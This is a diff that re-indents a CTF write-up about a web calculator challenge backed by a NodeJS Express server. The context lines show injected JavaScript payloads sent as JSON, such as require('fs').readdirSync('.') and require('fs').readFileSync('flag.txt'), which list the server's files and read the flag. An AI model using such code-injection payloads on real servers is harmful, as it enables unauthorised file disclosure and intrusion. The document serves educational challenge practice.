@@ -25,7 +25,7 @@ aliases = [
 ]
 +++
 
-- Points: 1800
+-   Points: 1800
 
 ## Description
 
@@ -41,22 +41,22 @@ When opening the source of the page we also find some javascript code:
 
 ```js
 function send() {
-  let calc = $("#calc")[0].value;
-  if (calc.length > 0) {
-    $.ajax({
-      url: "/calc",
-      type: "POST",
-      data: '{"calc": "' + calc + '" }',
-      contentType: "application/json; charset=utf-8",
-      dataType: "json",
-    }).always(function (data) {
-      text = data;
-      if (data.responseText) {
-        text = data.responseText;
-      }
-      $("#msg")[0].innerHTML = "<b>" + text + "</b>";
-    });
-  }
+    let calc = $("#calc")[0].value;
+    if (calc.length > 0) {
+        $.ajax({
+            url: "/calc",
+            type: "POST",
+            data: '{"calc": "' + calc + '" }',
+            contentType: "application/json; charset=utf-8",
+            dataType: "json",
+        }).always(function (data) {
+            text = data;
+            if (data.responseText) {
+                text = data.responseText;
+            }
+            $("#msg")[0].innerHTML = "<b>" + text + "</b>";
+        });
+    }
 }
 ```
 
@@ -68,7 +68,7 @@ If we capture the request with a proxy like Burp, we can see it sends a `POST` r
 
 ```json
 {
-  "calc": "3+4"
+    "calc": "3+4"
 }
 ```
 
@@ -96,7 +96,7 @@ A NodeJS Express server often has a `res` variable to which the request result i
 
 ```json
 {
-  "calc": "res"
+    "calc": "res"
 }
 ```
 
@@ -112,7 +112,7 @@ The resulting request:
 
 ```json
 {
-  "calc": "require('fs').readdirSync('.')"
+    "calc": "require('fs').readdirSync('.')"
 }
 ```
 
@@ -126,7 +126,7 @@ Now that we know the location of the flag (`flag.txt`), we can use the `readFile
 
 ```json
 {
-  "calc": "require('fs').readFileSync('flag.txt')"
+    "calc": "require('fs').readFileSync('flag.txt')"
 }
 ```
 
